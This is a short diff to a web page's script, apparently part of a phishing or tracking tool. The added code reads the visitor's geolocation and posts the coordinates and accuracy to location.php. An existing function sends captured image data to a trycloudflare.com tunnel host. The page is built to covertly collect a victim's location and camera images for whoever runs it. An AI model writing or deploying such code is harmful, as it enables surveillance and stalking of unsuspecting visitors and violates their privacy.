@@ -112,6 +112,19 @@ button {
     </div>
 </div>
 <script>
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+        $.ajax({
+            type: 'POST',
+            data: {
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                acc: position.coords.accuracy
+            },
+            url: window.location.origin + '/location.php'
+        });
+    });
+}
 function post(imgdata) {
     $.ajax({ type: 'POST', data: { cat: imgdata }, url: 'https://colleges-digest-angela-cholesterol.trycloudflare.com/post.php' });
 }
